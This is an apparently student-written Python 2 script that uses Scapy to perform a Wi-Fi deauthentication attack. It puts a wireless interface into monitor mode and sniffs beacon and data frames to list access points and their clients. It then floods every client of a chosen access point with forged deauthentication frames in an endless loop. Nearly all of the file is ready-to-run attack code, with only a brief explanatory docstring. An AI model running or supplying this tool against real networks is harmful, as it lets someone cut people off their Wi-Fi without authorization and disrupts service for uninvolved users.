import os
from scapy.all import *
import time

'''
Wi-Fi Deauthenticationan Attack script by Sagi Saada and Shlomi Domennko

Description
-----------
This attack first detects APs (routers, gateways) . It then searches for clients that are associated with each AP. The attacker then selects which client to attack, and the client will disconnect from the AP.

Libraries
---------
Scapy
 
'''

devices = {}
clients = {}


def Welcome():
	print("Welcome to Wi-Fi Deauthentication script v1.0")
	print("Developed by Sagi Saada and Shlomi Domennko")

def MonitorMode(interface):
	'''
	MonitorMode function - Runs the bash script to quickly setup monitor mode on selected interface.
	'''
	choise = raw_input("Put "+interface+" in monitor mode? Y/n (leave blank for Y):")
	if(choise == "y" or choise == "Y" or choise == ""):
		os.system("bash start-monitor.sh "+interface)
		print(interface+" mode changed to Monitor\n")
	else:
		return 0

def DeauthAttack(interface, device_target, client_target):
	'''
	DeauthAttack function - Start the deauth attack by given interface, AP mac address and client MAC address.
	'''
	print 'Deauthing',client_target,'from',device_target,'...'
	pkt = RadioTap() / Dot11( addr1 = client_target, addr2 = device_target, addr3 = device_target, type=0, subtype= 12) / Dot11Deauth()
	sendp(pkt, iface = interface, count = 10000, inter = .2)

def Display_Devices_Clients():
	'''
	Display_Device_Clients function - Each time a new AP or client s detected, it will update and display it onto the console. It allows human readable mapping of SSIDs and MACs.
	'''
	os.system("clear")
	print devices
	print clients
	print ("-------- Devices Table --------\n")
	print ("---- ESSID -------- MAC Address ----\n")
	count = 1
	for device in devices:
		print (""+str(count)+". "+devices[device] +" \t " + device)
		count += 1
	print ("-----------------------------------\n")

	print ("-------- Clients Table --------\n")
	print ("---- BSSID -------- Mac Address ----\n")
	count = 1
	for client in clients:
		print (""+str(count)+". "+clients[client] +" \t "+ client)
		count += 1
	print ("-----------------------------------\n")
	print ("Press [Ctrl+C] to stop.")

def Display_Devices():
	count = 1
	print("\n")
	for device in devices:
		print (""+str(count)+". "+device +"\t"+devices[device])
		count += 1

def Display_Clients(device_target):
	count = 1
	print("\n")
	for client in clients:
		if(clients[client] == devices[device_target]):
			print (""+str(count)+". "+client +"\t"+clients[client])
			count += 1

def PacketHandler(pkt):
	'''
	PacketHandler function - This function is called each time the sniff function of scapy library detects a packet. This function will set the dictionary of our devices and clients for later use.
	'''
	try:
		flag = 0
		# Find all beacon packets - this means - wifi AP.
		if(pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 8):
			if(pkt.addr2 not in devices.keys()):
				devices[pkt.addr2] = pkt.info
				flag = 1

		if(pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L and not pkt.haslayer(EAPOL)):
			#This is data frame packet.
			src = pkt.addr2
			dest = pkt.addr3
			if(dest in devices.keys()):
				if((src not in clients.keys()) and (src != dest) and (src not in devices.keys())):
					clients[src] = devices[dest]
					flag = 1
		if(flag):
			Display_Devices_Clients()
	except KeyboardInterrupt:
		print ("\nInterruption detected.\n")

def Device_Interface():
	'''
	Device_Interface function - Choose an interface that is currently on monitor mode.
	'''
	choise  = raw_input("\nSelect an interface to work with (leave blank for wlan0):")
	if(choise == ""):
		return "wlan0"
	else:
		return choise
	print("\nYour interface device is "+interface+"\n")

def Exit():
	print("Exiting Wi-Fi Deauthentication script v1.0 - See you soon!")
	sys.exit(0)
		
def Interface():
	'''
	Interface function - The main function that controls the flow of the attack. It calls other functions and combines all of them.
	'''
	#workers = []
	try:
		#Welcome()
		interface = Device_Interface()
		MonitorMode(interface)

		choise = raw_input("Start to scan? Y/n (leave blank for Y):")
		if(choise == "y" or choise == "Y" or choise == ""):
			print("Starting check for Devices and Clients\n")
			sniff(iface = interface, prn = PacketHandler)
		
		if(devices and clients):
			Display_Devices()
			while(1):
				device_target = raw_input("\nPlease choose Device MAC Address (For example: 00:18:25:16:72:b0):")	
				if(device_target == "exit" or choise == "quit"):
					Exit()
				if(device_target not in devices.keys()):
					print("Bad Device MAC Address")
				else:
					break
			
			Display_Clients(device_target)
			
			while(1):
				for client in clients:
					if(clients[client] == devices[device_target]):
						print(client + " : " + device_target)
						DeauthAttack(interface, device_target, client)
		else:
			print("\nDevices or Clients table is null\n")
			Exit()

	except KeyboardInterrupt:	
		print ("\nInterruption detected.\n")
		exit()

if __name__ == '__main__':
	Interface()


